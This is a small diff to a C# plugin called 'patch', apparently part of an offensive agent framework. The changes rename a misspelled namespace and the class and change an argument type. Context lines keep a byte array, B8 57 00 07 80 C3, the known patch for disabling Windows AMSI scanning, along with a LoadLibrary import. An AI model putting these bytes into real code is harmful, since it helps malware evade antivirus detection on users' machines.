@@ -3,9 +3,9 @@ using Athena.Utilities;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Plguins
+namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class Patch : AthenaPlugin
     {
         public override string Name => "patch";
         byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
@@ -24,7 +24,7 @@ namespace Plguins
 
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             try
             {
